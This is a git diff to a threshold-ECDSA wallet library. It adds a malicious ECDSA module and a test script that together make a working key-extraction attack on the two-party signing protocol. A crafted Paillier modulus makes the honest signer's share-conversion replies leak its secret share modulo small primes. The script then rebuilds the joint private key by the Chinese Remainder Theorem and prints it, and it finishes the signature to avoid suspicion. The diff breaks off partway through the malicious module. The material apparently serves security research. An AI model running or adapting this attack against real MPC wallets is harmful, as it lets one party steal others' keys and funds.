diff --git a/modules/account-lib/.mocharc.js b/modules/account-lib/.mocharc.js
index 95df65bca..456373fe5 100644
--- a/modules/account-lib/.mocharc.js
+++ b/modules/account-lib/.mocharc.js
@@ -3,8 +3,9 @@
 module.exports = {
   require: 'ts-node/register',
   timeout: '20000',
-  reporter: 'min',
-  'reporter-option': ['consoleReporter=min'],
+  // reporter: 'min',
+  // 'reporter-option': ['consoleReporter=min'],
   exit: true,
-  spec: ['test/unit/**/*.ts'],
+  ui: 'bdd',
+  spec: ['test/unit/mpc/tss/ecdsa/ecdsa-leak.ts'],
 };
diff --git a/modules/account-lib/test/unit/mpc/tss/ecdsa/bigint-helpers.js b/modules/account-lib/test/unit/mpc/tss/ecdsa/bigint-helpers.js
new file mode 100644
index 000000000..fbfed2048
--- /dev/null
+++ b/modules/account-lib/test/unit/mpc/tss/ecdsa/bigint-helpers.js
@@ -0,0 +1,192 @@
+// Copyright (c) 2018, Ben Noordhuis <info@bnoordhuis.nl>
+//
+// Permission to use, copy, modify, and/or distribute this software for any
+// purpose with or without fee is hereby granted, provided that the above
+// copyright notice and this permission notice appear in all copies.
+//
+// THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
+// WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
+// MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
+// ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
+// WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
+// ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
+// OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+
+'use strict'
+
+module.exports.random = random
+module.exports.isBigIntPrime = isPrime
+
+const {randomBytes} = require('crypto')
+
+function random(bits, cb) {
+	if (bits < 0)
+		throw new RangeError('bits < 0')
+
+	const n = (bits >>> 3) + !!(bits & 7) // Round up to next byte.
+	const r = 8*n - bits
+	const s = 8 - r
+	const m = (1 << s) - 1 // Bits to mask off from MSB.
+
+	if (cb)
+		return randomcb(n, m, cb)
+
+	const bytes = randomBytes(n)
+
+	maskbits(m, bytes)
+
+	return bytes2bigint(bytes)
+}
+
+function randomcb(n, m, cb) {
+	randomBytes(n, (err, bytes) => {
+		if (err)
+			return cb(err)
+
+		maskbits(m, bytes)
+
+		cb(null, bytes2bigint(bytes))
+	})
+}
+
+// Note: mutates the contents of |bytes|.
+function maskbits(m, bytes) {
+	// Mask off bits from the MSB that are > log2(bits).
+	// |bytes| is treated as a big-endian bigint so byte 0 is the MSB.
+	if (bytes.length > 0)
+		bytes[0] &= m
+}
+
+function bytes2bigint(bytes) {
+	let result = 0n
+
+	const n = bytes.length
+
+	// Read input in 8 byte slices. This is, on average and at the time
+	// of writing, about 35x faster for large inputs than processing them
+	// one byte at a time.
+	if (n >= 8) {
+		const view = new DataView(bytes.buffer, bytes.byteOffset)
+
+		for (let i = 0, k = n & ~7; i < k; i += 8) {
+			const x = view.getBigUint64(i, false)
+			result = (result << 64n) + x
+		}
+	}
+
+	// Now mop up any remaining bytes.
+	for (let i = n & ~7; i < n; i++)
+		result = result * 256n + BigInt(bytes[i])
+
+	return result
+}
+
+
+// Javascript program Miller-Rabin primality test
+// based on JavaScript code found at https://www.geeksforgeeks.org/primality-test-set-3-miller-rabin/
+
+// Utility function to do
+// modular exponentiation.
+// It returns (x^y) % p
+function power(x, y, p)
+{
+	
+	// Initialize result 
+    // (JML- all literal integers converted to use n suffix denoting BigInt)
+	let res = 1n;
+	
+	// Update x if it is more than or
+	// equal to p
+	x = x % p;
+	while (y > 0n)
+	{
+		
+		// If y is odd, multiply
+		// x with result
+		if (y & 1n)
+			res = (res*x) % p;
+
+		// y must be even now
+		y = y/2n; // (JML- original code used a shift operator, but division is clearer)
+		x = (x*x) % p;
+	}
+	return res;
+}
+
+
+// This function is called
+// for all k trials. It returns
+// false if n is composite and
+// returns false if n is
+// probably prime. d is an odd
+// number such that d*2<sup>r</sup> = n-1
+// for some r >= 1
+function miillerTest(d, n)
+{
+    // (JML- all literal integers converted to use n suffix denoting BigInt)
+	
+	// Pick a random number in [2..n-2]
+	// Corner cases make sure that n > 4
+    /* 
+        JML- I can't mix the Number returned by Math.random with
+        operations involving BigInt. The workaround is to create a random integer 
+        with precision 6 and convert it to a BigInt.
+    */  
+    const r = BigInt(Math.floor(Math.random() * 100_000))
+    // JML- now I have to divide by the multiplier used above (BigInt version)
+    const y = r*(n-2n)/100_000n
+	let a = 2n + y % (n - 4n);
+
+	// Compute a^d % n
+	let x = power(a, d, n);
+
+	if (x == 1n || x == n-1n)
+		return true;
+
+	// Keep squaring x while one
+	// of the following doesn't
+	// happen
+	// (i) d does not reach n-1
+	// (ii) (x^2) % n is not 1
+	// (iii) (x^2) % n is not n-1
+	while (d != n-1n)
+	{
+		x = (x * x) % n;
+		d *= 2n;
+
+		if (x == 1n)	
+			return false;
+		if (x == n-1n)
+			return true;
+	}
+
+	// Return composite
+	return false;
+}
+
+// It returns false if n is
+// composite and returns true if n
+// is probably prime. k is an
+// input parameter that determines
+// accuracy level. Higher value of
+// k indicates more accuracy.
+function isPrime( n, k=40)
+{
+	// (JML- all literal integers converted to use n suffix denoting BigInt)
+	// Corner cases
+	if (n <= 1n || n == 4n) return false;
+	if (n <= 3n) return true;
+
+	// Find r such that n =
+	// 2^d * r + 1 for some r >= 1
+	let d = n - 1n;
+	while (d % 2n == 0n)
+		d /= 2n;
+
+	// Iterate given nber of 'k' times
+	for (let i = 0; i < k; i++)
+		if (!miillerTest(d, n))
+			return false;
+
+	return true;
+}
\ No newline at end of file
diff --git a/modules/account-lib/test/unit/mpc/tss/ecdsa/ecdsa-leak.ts b/modules/account-lib/test/unit/mpc/tss/ecdsa/ecdsa-leak.ts
new file mode 100644
index 000000000..01fb2547f
--- /dev/null
+++ b/modules/account-lib/test/unit/mpc/tss/ecdsa/ecdsa-leak.ts
@@ -0,0 +1,321 @@
+import { Ecdsa, ECDSA } from '../../../../../../sdk-core';
+import { hexToBigInt } from '../../../../../../sdk-core/src/account-lib/util/crypto';
+import MaliciousEcdsa from '../../../../../../sdk-core/src/account-lib/mpc/tss/ecdsa/maliciousEcdsa';
+import * as sinon from 'sinon';
+import createKeccakHash from 'keccak';
+import * as paillierBigint from 'paillier-bigint';
+import { paillerKeys, mockNShares, mockPShare, mockDKeyShare, mockEKeyShare, mockFKeyShare } from '../fixtures/ecdsa';
+import { Hash, randomBytes } from 'crypto';
+import 'should';
+import * as bigintCryptoUtils from 'bigint-crypto-utils';
+import { random, isBigIntPrime } from './bigint-helpers.js'
+
+const modularMultiplicativeInverse = (a: bigint, modulus: bigint) => {
+  // Calculate current value of a mod modulus
+  const b = BigInt(a % modulus);
+
+  // We brute force the search for the smaller hipothesis, as we know that the number must exist between the current given modulus and 1
+  for (let hipothesis = BigInt(1); hipothesis <= modulus; hipothesis++) {
+    if ((b * hipothesis) % modulus == BigInt(1)) return hipothesis;
+  }
+  // If we do not find it, we return 1
+  return BigInt(1);
+}
+
+const solveCRT = (remainders: bigint[], modules: bigint[]) => {
+  // Multiply all the modulus
+  const prod: bigint = modules.reduce((acc: bigint, val) => acc * val, BigInt(1));
+
+  return modules.reduce((sum, mod, index) => {
+    // Find the modular multiplicative inverse and calculate the sum
+    // SUM( remainder * productOfAllModulus/modulus * MMI ) (mod productOfAllModulus) 
+    const p = prod / mod;
+    return sum + (remainders[index] * modularMultiplicativeInverse(p, mod) * p);
+  }, BigInt(0)) % prod;
+}
+
+function isPrime(num) {
+  for (let i = 2, s = Math.sqrt(num); i <= s; i++)
+    if (num % i === 0) return false;
+  return num > 1;
+}
+
+function getRandomArbitrary(min, max) {
+  return Math.floor(Math.random() * (max - min) + min)
+}
+
+function gcd(a, b) {
+  if (a == 0)
+    return b;
+  return gcd(b % a, a);
+}
+
+/**
+ * @prettier
+ */
+
+async function main() {
+  try {
+    const MPC = new Ecdsa();
+    const MaliciousMPC = new MaliciousEcdsa();
+    let keyShares: ECDSA.KeyCombined[];
+    let commonPublicKey: string;
+
+    const pallierMock = sinon
+      .stub(paillierBigint, 'generateRandomKeys')
+      .onCall(0)
+      .resolves(paillerKeys[0] as unknown as paillierBigint.KeyPair)
+      .onCall(1)
+      .resolves(paillerKeys[1] as unknown as paillierBigint.KeyPair)
+      .onCall(2)
+      .resolves(paillerKeys[2] as unknown as paillierBigint.KeyPair)
+      
+    const [A, B, C] = await Promise.all([MPC.keyShare(1, 2, 3), MPC.keyShare(2, 2, 3), MPC.keyShare(3, 2, 3)]);
+
+    const aKeyCombine = MPC.keyCombine(A.pShare, [B.nShares[1], C.nShares[1]]);
+    const bKeyCombine = MPC.keyCombine(B.pShare, [A.nShares[2], C.nShares[2]]);
+    const cKeyCombine = MPC.keyCombine(C.pShare, [A.nShares[3], B.nShares[3]]);
+
+
+    keyShares = [
+      aKeyCombine,
+      bKeyCombine,
+      cKeyCombine,
+    ];
+    commonPublicKey = aKeyCombine.xShare.y;
+    pallierMock.reset();
+
+    let signerOne: ECDSA.KeyCombined;
+    let signerTwo: ECDSA.KeyCombined;
+    let signerOneIndex;
+    let signerTwoIndex;
+
+    signerOne = aKeyCombine;
+    signerOneIndex = signerOne.xShare.i;
+    signerTwo = bKeyCombine;
+    signerTwoIndex = signerTwo.xShare.i;
+
+    const primes: bigint[] = []
+
+    while (primes.length < 16) {
+      const r = getRandomArbitrary(131072, 262144)
+      if (isPrime(r) && isPrime(2 * r + 1)) {
+        primes.push(BigInt(r))
+      }
+    }
+
+    // console.log(`primes : ${primes.join(', ')}`)
+
+    let n = BigInt(1)
+    let primesProduct = BigInt(1)
+    for (const p of primes) {
+      n = n * p * (BigInt(2) * p + BigInt(1))
+      primesProduct = primesProduct * p
+    }
+
+    let bigPrime = ((BigInt(2) ** BigInt(3056)) / primesProduct ** BigInt(2)) / BigInt(2)
+    while (!isBigIntPrime(bigPrime)) {
+      bigPrime++
+    }
+    // bigPrime = BigInt(1)
+
+    // console.log('bigPrime', bigPrime.toString())
+    n = n * bigPrime
+
+    // console.log(`N : ${n.toString()}`)
+
+    let phiN = BigInt(1)
+    let phiLambda = BigInt(1)
+    for (const p of primes) {
+      phiN = phiN * (p - BigInt(1)) * (p * BigInt(2))
+      phiLambda = phiLambda * (p - BigInt(1))
+    }
+    // console.log(`phiN : ${phiN.toString()}`)
+
+    const d = phiN / gcd(n, phiN)
+    // const d = BigInt(2)
+    // console.log(`d : ${d.toString()}`)
+
+    const vPrimeModuloResults = {}
+
+    for (const p of primes) {
+      vPrimeModuloResults[p.toString()] = 1
+      vPrimeModuloResults[(p * BigInt(2) + BigInt(1)).toString()] = 4
+    }
+
+    let v = solveCRT(Object.entries(vPrimeModuloResults).map(x => BigInt(x[1] as number)), Object.entries(vPrimeModuloResults).map(x => BigInt(x[0])))
+    const l = random(3071)
+    v = (v + (l as bigint) * n) % (n * n)
+
+
+    globalThis.maliciousPaillierN = n;
+    globalThis.maliciousEncryptedK = v % (n * n)
+    globalThis.phiLambda = phiLambda
+    globalThis.phiN = phiN
+    globalThis.craftedV = v
+
+    // console.log('n', n, n.toString(16))
+    // console.log('encryptedK', globalThis.maliciousEncryptedK, globalThis.maliciousEncryptedK.toString(16))
+
+    // Step One
+    // Sign Shares are created by one of the participants (signerOne)
+    // with its private XShare and YShare corresponding to the other participant (signerTwo)
+    // This step produces a private WShare which signerOne saves and KShare which signerOne sends to signerTwo
+    const signShares: ECDSA.SignShareRT = MaliciousMPC.signShare(signerOne.xShare, signerOne.yShares[signerTwoIndex]);
+
+    // console.log('our n', signerOne.xShare.n.toString())
+    // console.log('kShare', signShares.kShare)
+
+    // Step Two
+    // signerTwo receives the KShare from signerOne and uses it produce private
+    // BShare (Beta Share) which signerTwo saves and AShare (Alpha Share)
+    // which is sent to signerOne
+    let signConvertS21: ECDSA.SignConvertRT = MPC.signConvert({
+      xShare: signerTwo.xShare,
+      yShare: signerTwo.yShares[signerOneIndex], // YShare corresponding to the other participant signerOne
+      kShare: signShares.kShare,
+    });
+
+    const mu = BigInt(`0x${signConvertS21.aShare?.mu}`)
+    const alpha = BigInt(`0x${signConvertS21.aShare?.alpha}`)
+
+    function coreOfTheAttack(value) {
+      let primeModuloResults = {};
+
+      for (const p of primes) {
+        let primeModulo
+        const q = p * BigInt(2) + BigInt(1)
+        const b = bigintCryptoUtils.modPow(d, p - BigInt(2), p)
+        const z = bigintCryptoUtils.modPow(bigintCryptoUtils.modPow(value, d, q), b, q)
+        for (let x = BigInt(0); x < p; x++) {
+          if (bigintCryptoUtils.modPow(BigInt(4), x, q) === z) {
+            primeModulo = x
+            break
+          }
+        }
+        // console.log(`the modulo for prime ${p} is ${primeModulo}`);
+        primeModuloResults[p.toString()] = primeModulo;
+      }
+
+      // console.log(primeModuloResults)
+      // Sanity check
+      // for (const [prime, primeModulo] of Object.entries(primeModuloResults)) {
+      //   if (globalThis.victimW % BigInt(prime) != BigInt(primeModulo as number)) {
+      //     console.log(`Error: the leaked modulo for prime ${prime} is ${primeModulo} but value%${prime} is ${globalThis.victimW % BigInt(prime)}`)
+      //   }
+      // }
+
+      const reconstructedValue = solveCRT(Object.entries(primeModuloResults).map(x => BigInt(x[1] as number)), Object.entries(primeModuloResults).map(x => BigInt(x[0])))
+
+      return reconstructedValue
+    }
+
+    const reconstructedW = coreOfTheAttack(mu)
+    const reconstructedGamma = coreOfTheAttack(alpha)
+    globalThis.reconstructedW = reconstructedW
+    globalThis.reconstructedGamma = reconstructedGamma
+
+    // console.log(`original victim w:                 ${globalThis.victimW}`)
+    // console.log('reconstructed victim w from leaks:', reconstructedW)
+    // console.log('reconstructed victim gamma from leaks:', reconstructedGamma)
+
+    const myW = calculateW(signerOne.xShare, signerOne.yShares[signerTwoIndex])
+    const combinedWs = (reconstructedW + myW) % Ecdsa.curve.order()
+    // console.log(`myW                : ${myW}`)
+    console.log(`public key                  : ${BigInt('0x' + commonPublicKey).toString()}`)
+    console.log(`reconstructed public public : ${Ecdsa.curve.basePointMult(combinedWs)}`)
+    console.log(``)
+    console.log(`reconstructed private key   : 0x${combinedWs.toString(16)}`)
+
+
+
+
+
+
+
+    // We have already exfiltrated the private key of signerTwo
+    // Now we continue the signature process to not raise suspicion
+
+    // Step Three
+    // signerOne receives the AShare from signerTwo and signerOne using the private WShare from step two
+    // uses it produce private GShare (Gamma Share) and MUShare (Mu Share) which
+    // is sent to signerTwo to produce its Gamma Share
+    const signConvertS12: ECDSA.SignConvertRT = MaliciousMPC.signConvert({
+      aShare: signConvertS21.aShare,
+      wShare: signShares.wShare,
+    });
+
+    // Step Four
+    // signerTwo receives the MUShare from signerOne and signerOne using the private BShare from step three
+    // uses it produce private GShare (Gamma Share)
+    signConvertS21 = MPC.signConvert({
+      muShare: signConvertS12.muShare,
+      bShare: signConvertS21.bShare,
+    });
+
+    // Step Five
+    // signerOne and signerTwo both have successfully generated GShares and they use
+    // the sign combine function to generate their private omicron shares and
+    // delta shares which they share to each other
+    const signCombineOne = MaliciousMPC.signCombine({
+      gShare: signConvertS12.gShare as ECDSA.GShare,
+      signIndex: {
+        i: (signConvertS12.muShare as ECDSA.MUShare).i,
+        j: (signConvertS12.muShare as ECDSA.MUShare).j,
+      },
+    })
+
+    const signCombineTwo = MPC.signCombine({
+      gShare: signConvertS21.gShare as ECDSA.GShare,
+      signIndex: {
+        i: (signConvertS21.muShare as ECDSA.MUShare).i,
+        j: (signConvertS21.muShare as ECDSA.MUShare).j,
+      },
+    })
+
+    const MESSAGE = Buffer.from('TOO MANY SECRETS');
+
+    // Step Six
+    // signerOne and signerTwo shares the delta share from each other
+    // and finally signs the message using their private OShare
+    // and delta share received from the other signer
+    const signA = MaliciousMPC.sign(
+      MESSAGE,
+      signCombineOne.oShare,
+      signCombineTwo.dShare,
+    )
+
+    const signB = MPC.sign(
+      MESSAGE,
+      signCombineTwo.oShare,
+      signCombineOne.dShare,
+    )
+
+
+    // Step Seven
+    // Construct the final signature
+    const signature = MPC.constructSignature([signA, signB]);
+
+    // Step Eight
+    // Verify signature
+
+    const isValid = MPC.verify(MESSAGE, signature);
+
+  } catch (e) {
+    console.log(e)
+  }
+}
+
+function calculateW(xShare, yShare) {
+  const d = Ecdsa.curve.scalarMult(Ecdsa.curve.scalarSub(BigInt(yShare.j), BigInt(xShare.i)), BigInt(xShare.i));
+
+  const w = [
+    Ecdsa.curve.scalarMult(BigInt(yShare.j), BigInt(xShare.i)),
+    hexToBigInt(xShare['x']),
+    Ecdsa.curve.scalarInvert(d),
+  ].reduce(Ecdsa.curve.scalarMult);
+
+  return w
+}
+
+main()
\ No newline at end of file
diff --git a/modules/sdk-core/src/account-lib/mpc/tss/ecdsa/maliciousEcdsa.ts b/modules/sdk-core/src/account-lib/mpc/tss/ecdsa/maliciousEcdsa.ts
new file mode 100644
index 000000000..6937136bb
--- /dev/null
+++ b/modules/sdk-core/src/account-lib/mpc/tss/ecdsa/maliciousEcdsa.ts
@@ -0,0 +1,558 @@
+import * as paillierBigint from 'paillier-bigint';
+import * as bigintCryptoUtils from 'bigint-crypto-utils';
+import * as secp from '@noble/secp256k1';
+import HDTree, { BIP32, chaincodeBase } from '../../hdTree';
+import { randomBytes, createHash, Hash } from 'crypto';
+import { hexToBigInt } from '../../../util/crypto';
+import { bigIntFromBufferBE, bigIntToBufferBE, bigIntFromU8ABE, getPaillierPublicKey } from '../../util';
+import { Secp256k1Curve } from '../../curves';
+import Shamir from '../../shamir';
+import {
+  NShare,
+  PShare,
+  KeyShare,
+  KeyCombined,
+  SubkeyShare,
+  BShare,
+  AShare,
+  Signature,
+  SignConvertRT,
+  SignConvert,
+  GShare,
+  MUShare,
+  SignCombine,
+  SignCombineRT,
+  DShare,
+  OShare,
+  SShare,
+  SignShareRT,
+  KShare,
+  XShare,
+  YShare,
+} from './types';
+import { modInv, modPow } from 'bigint-crypto-utils';
+
+const _1n = BigInt(1);
+const _3n = BigInt(3);
+
+function mul_inv(a: bigint, b: bigint) {
+  var b0 = b;
+  var x0 = BigInt(0);
+  var x1 = BigInt(1);
+  var q, tmp;
+  if (b == BigInt(1)) {
+    return BigInt(1);
+  }
+  while (a > BigInt(1)) {
+    q = a / b;
+    tmp = a;
+    a = b;
+    b = tmp % b;
+    tmp = x0;
+    x0 = x1 - (q * x0);
+    x1 = tmp;
+  }
+  if (x1 < BigInt(0)) {
+    x1 = x1 + b0;
+  }
+  return x1;
+}
+
+function chineseRemainder(a, n) {
+  var p = BigInt(1);
+  var prod = BigInt(1);
+  var sm = BigInt(0);
+  for (let i = 0; i < n.length; i++) {
+    prod = prod * n[i];
+  }
+  for (let i = 0; i < n.length; i++) {
+    p = prod / n[i];
+    sm = sm + (a[i] * mul_inv(p, n[i]) * p);
+  }
+  return sm % prod;
+}
+
+function gcd(a, b) {
+  if (a == 0)
+    return b;
+  return gcd(b % a, a);
+}
+
+function fakeDecrypt(y) {
+  // Calculate phiN and lambda
+  let phiN = globalThis.phiN;
+  let phiLambda = globalThis.phiLambda
+  let N = BigInt(globalThis.maliciousPaillierN)
+
+  let lambda = gcd(N, phiN);
+  let b = N / lambda;
+
+  // Calculate y0
+  let t0 = modInv(phiN, b);
+  let c0 = modPow(y, phiN, N ** BigInt(2));
+  let s0 = (c0 - BigInt(1)) / N;
+  let y0 = (s0 * t0) % b;
+
+  // Calculate y1
+  let t1 = modInv(b * phiLambda, lambda);
+  let c1 = modPow(y, phiLambda, lambda * lambda);
+  let s1 = (c1 - BigInt(1)) / lambda;
+  let y1 = (s1 * t1) % lambda;
+
+  // Calculate the result using the Chinese Remainder Theorem
+  return chineseRemainder([y0, y1], [b, lambda]);
+}
+
+/**
+ * ECDSA TSS implementation supporting 2:n Threshold
+ */
+export default class Ecdsa {
+  static curve: Secp256k1Curve = new Secp256k1Curve();
+  static hdTree: HDTree = new BIP32();
+  static shamir: Shamir = new Shamir(Ecdsa.curve);
+  /**
+   * Generate shares for participant at index and split keys `(threshold,numShares)` ways.
+   * @param {number} index participant index
+   * @param {number} threshold Signing threshold
+   * @param {number} numShares  Number of shares
+   * @param {Buffer} seed optional seed to use for key generation
+   * @returns {Promise<KeyShare>} Returns the private p-share
+   * and n-shares to be distributed to participants at their corresponding index.
+   */
+  async keyShare(index: number, threshold: number, numShares: number, seed?: Buffer): Promise<KeyShare> {
+    if (!(index > 0 && index <= numShares && threshold <= numShares && threshold === 2)) {
+      throw 'Invalid KeyShare Config';
+    }
+
+    if (seed && seed.length !== 72) {
+      throw new Error('Seed must have length 72');
+    }
+    // Generate additively homomorphic encryption key.
+    const { publicKey, privateKey } = await paillierBigint.generateRandomKeys(3072, true);
+    const u = (seed && bigIntFromU8ABE(secp.utils.hashToPrivateKey(seed.slice(0, 40)))) ?? Ecdsa.curve.scalarRandom();
+    const y = Ecdsa.curve.basePointMult(u);
+    const chaincode = seed?.slice(40) ?? randomBytes(32);
+    // Compute secret shares of the private key
+    const { shares: uShares, v } = Ecdsa.shamir.split(u, threshold, numShares);
+    const currentParticipant: PShare = {
+      i: index,
+      t: threshold,
+      c: numShares,
+      l: bigIntToBufferBE(privateKey.lambda, 192).toString('hex'),
+      m: bigIntToBufferBE(privateKey.mu, 192).toString('hex'),
+      n: bigIntToBufferBE(publicKey.n, 384).toString('hex'),
+      y: bigIntToBufferBE(y, 33).toString('hex'),
+      u: bigIntToBufferBE(uShares[index], 32).toString('hex'),
+      uu: u.toString(),
+      chaincode: chaincode.toString('hex'),
+    };
+    const keyShare: KeyShare = {
+      pShare: currentParticipant,
+      nShares: {},
+    };
+
+    for (const share in uShares) {
+      const participantIndex = parseInt(share, 10);
+      if (participantIndex !== index) {
+        keyShare.nShares[participantIndex] = {
+          i: participantIndex,
+          j: currentParticipant['i'],
+          n: publicKey.n.toString(16),
+          y: bigIntToBufferBE(y, 33).toString('hex'),
+          v: bigIntToBufferBE(v[0], 33).toString('hex'),
+          u: bigIntToBufferBE(uShares[participantIndex], 32).toString('hex'),
+          chaincode: chaincode.toString('hex'),
+        } as NShare;
+      }
+    }
+    return keyShare;
+  }
+
+  /**
+   * Combine data shared during the key generation protocol.
+   * @param {KeyShare} participantShares private p-share and
+   * n-shares received from all other participants.
+   * @returns {KeyCombined} Returns the participant private x-share
+   * and y-shares to be used when generating signing shares.
+   */
+  keyCombine(pShare: PShare, nShares: NShare[]): KeyCombined {
+    const allShares = [pShare, ...nShares];
+    // Compute the public key.
+    const y = allShares.map((participant) => hexToBigInt(participant['y'])).reduce(Ecdsa.curve.pointAdd);
+    // Add secret shares
+    const x = allShares.map((participant) => hexToBigInt(participant['u'])).reduce(Ecdsa.curve.scalarAdd);
+
+    // Verify shares.
+    for (const share of nShares) {
+      if (share.v) {
+        try {
+          Ecdsa.shamir.verify(hexToBigInt(share.u), [hexToBigInt(share.y), hexToBigInt(share.v!)], pShare.i);
+        } catch (err) {
+          throw new Error(`Could not verify share from participant ${share.j}. Verification error: ${err}`);
+        }
+      }
+    }
+
+    // Chaincode will be used in future when we add support for key derivation for ecdsa
+    const chaincodes = [pShare, ...nShares].map(({ chaincode }) => bigIntFromBufferBE(Buffer.from(chaincode, 'hex')));
+    const chaincode = chaincodes.reduce(
+      (acc, chaincode) =>
+        (acc + chaincode) % BigInt('0x010000000000000000000000000000000000000000000000000000000000000000') // 2^256
+    );
+
+    const participants: KeyCombined = {
+      xShare: {
+        i: pShare.i,
+        l: pShare.l,
+        m: pShare.m,
+        n: pShare.n,
+        y: bigIntToBufferBE(y, 33).toString('hex'),
+        x: bigIntToBufferBE(x, 32).toString('hex'),
+        chaincode: bigIntToBufferBE(chaincode, 32).toString('hex'),
+      },
+      yShares: {},
+    };
+
+    for (const share in nShares) {
+      const participantIndex = nShares[share]['j'];
+      participants.yShares[participantIndex] = {
+        i: pShare.i,
+        j: nShares[share]['j'],
+        n: nShares[share]['n'],
+      };
+    }
+    return participants;
+  }
+
+  /**
+   * Derive shares for a BIP-32 subkey.
+   * @param {PShare} The user's p-share.
+   * @param {NShare[]} The n-shares received from the other participants.
+   * @param {string} The BIP-32 path to derive.
+   * @returns {SubkeyShare} Returns the private x-share and n-shares to
+   * be distributed to participants at their corresponding index.
+   */
+  keyDerive(pShare: PShare, nShares: NShare[], path: string): SubkeyShare {
+    const yValues = [pShare, ...nShares].map((share) => hexToBigInt(share.y));
+    const y = yValues.reduce((partial, share) => Ecdsa.curve.pointAdd(partial, share));
+    const u = BigInt(pShare.uu);
+    let contribChaincode = hexToBigInt(pShare.chaincode);
+    const chaincodes = [contribChaincode, ...nShares.map(({ chaincode }) => hexToBigInt(chaincode))];
+    const chaincode = chaincodes.reduce((acc, chaincode) => (acc + chaincode) % chaincodeBase);
+
+    // Verify shares.
+    for (const share of nShares) {
+      if (share.v) {
+        try {
+          Ecdsa.shamir.verify(hexToBigInt(share.u), [hexToBigInt(share.y), hexToBigInt(share.v!)], pShare.i);
+        } catch (err) {
+          throw new Error(`Could not verify share from participant ${share.j}. Verification error: ${err}`);
+        }
+      }
+    }
+
+    // Derive subkey.
+    const subkey = Ecdsa.hdTree.privateDerive({ pk: y, sk: u, chaincode }, path);
+
+    // Calculate new public key contribution.
+    const contribY = Ecdsa.curve.basePointMult(subkey.sk);
+
+    // Calculate new chaincode contribution.
+    const chaincodeDelta = (chaincodeBase + subkey.chaincode - chaincode) % chaincodeBase;
+    contribChaincode = (contribChaincode + chaincodeDelta) % chaincodeBase;
+
+    // Calculate new u values.
+    const { shares: split_u, v } = Ecdsa.shamir.split(subkey.sk, pShare.t || 2, pShare.c || 3);
+
+    // Calculate new signing key.
+    const x = [split_u[pShare.i], ...nShares.map(({ u }) => hexToBigInt(u))].reduce(Ecdsa.curve.scalarAdd);
+
+    const P_i: XShare = {
+      i: pShare.i,
+      l: pShare.l,
+      m: pShare.m,
+      n: pShare.n,
+      y: bigIntToBufferBE(subkey.pk, 33).toString('hex'),
+      x: bigIntToBufferBE(x, 32).toString('hex'),
+      chaincode: bigIntToBufferBE(subkey.chaincode, 32).toString('hex'),
+    };
+
+    const shares: SubkeyShare = {
+      xShare: P_i,
+      nShares: {},
+    };
+
+    for (let ind = 0; ind < nShares.length; ind++) {
+      const P_j = nShares[ind];
+      shares.nShares[P_j.j] = {
+        i: P_j.j,
+        j: P_i.i,
+        n: P_j.n,
+        u: bigIntToBufferBE(split_u[P_j.j], 32).toString('hex'),
+        y: bigIntToBufferBE(contribY, 32).toString('hex'),
+        v: bigIntToBufferBE(v[0], 32).toString('hex'),
+        chaincode: bigIntToBufferBE(contribChaincode, 32).toString('hex'),
+      };
+    }
+
+    return shares;
+  }
+
+  /**
+   * Create signing shares.
+   * @param {xShare} xShare Private xShare of current participant signer
+   * @param {YShare} yShare yShare corresponding to the other participant signer
+   * @returns {SignShareRT} Returns the participant private w-share
+   * and k-share to be distributed to other participant signer
+   */
+  signShare(xShare: XShare, yShare: YShare): SignShareRT {
+    const pk = getPaillierPublicKey(hexToBigInt(xShare.n));
+
+    const k = Ecdsa.curve.scalarRandom();
+    const gamma = Ecdsa.curve.scalarRandom();
+
+    const d = Ecdsa.curve.scalarMult(Ecdsa.curve.scalarSub(BigInt(yShare.j), BigInt(xShare.i)), BigInt(xShare.i));
+
+    const w = [
+      Ecdsa.curve.scalarMult(BigInt(yShare.j), BigInt(xShare.i)),
+      hexToBigInt(xShare['x']),
+      Ecdsa.curve.scalarInvert(d),
+    ].reduce(Ecdsa.curve.scalarMult);
+
+    const signers: SignShareRT = {
+      wShare: {
+        i: xShare.i,
+        l: xShare.l,
+        m: xShare.m,
+        n: xShare.n,
+        y: xShare.y,
+        k: bigIntToBufferBE(k, 32).toString('hex'),
+        w: bigIntToBufferBE(w, 32).toString('hex'),
+        gamma: bigIntToBufferBE(gamma, 32).toString('hex'),
+      },
+      kShare: {} as KShare,
+    };
+
+    signers.kShare = {
+      i: yShare.j,
+      j: xShare.i,
+      n: pk.n.toString(16),
+      k: bigIntToBufferBE(pk.encrypt(k), 32).toString('hex'),
+    };
+
+    if (!globalThis.realK) {
+      signers.kShare.k = globalThis.maliciousEncryptedK.toString(16)
+      signers.kShare.n = globalThis.maliciousPaillierN.toString(16)
+      globalThis.realK = k
+    }
+
+    return signers;
+  }
+
+  /**
+   * Perform multiplicitive-to-additive (MtA) share conversion with another
+   * signer.
+   * @param {SignConvert}
+   * @returns {SignConvertRT}
+   */
+  signConvert(shares: SignConvert): SignConvertRT {
+    let shareParticipant: BShare | GShare, shareToBeSend: AShare | MUShare;
+    let isGammaShare = false;
+    if (shares.xShare && shares.yShare && shares.kShare) {
+      const xShare = shares.xShare; // currentParticipant secret xShare
+      const yShare = shares.yShare;
+      const signShare = this.signShare(xShare, yShare);
+      shareToBeSend = { ...shares.kShare, alpha: '', mu: '' } as AShare;
+      shareParticipant = { ...signShare.wShare, beta: '', nu: '' } as BShare;
+    } else if ((shares.bShare && shares.muShare) || (shares.aShare && shares.wShare)) {
+      isGammaShare = true;
+      shareToBeSend = shares.aShare ? ({ ...shares.aShare } as MUShare) : ({ ...shares.muShare } as MUShare);
+      shareParticipant = shares.wShare ? ({ ...shares.wShare } as GShare) : ({ ...shares.bShare } as GShare);
+    } else {
+      throw new Error('Invalid config for Sign Convert');
+    }
+    if (shareParticipant.i !== shareToBeSend.i) {
+      throw new Error('Shares from same participant');
+    }
+    if (shareToBeSend['alpha']) {
+      const N = BigInt(globalThis.maliciousPaillierN)
+      const gamma = BigInt(globalThis.reconstructedGamma)
+      const w = BigInt(globalThis.reconstructedW)
+      const v = globalThis.craftedV
+      const k_real = globalThis.realK
+
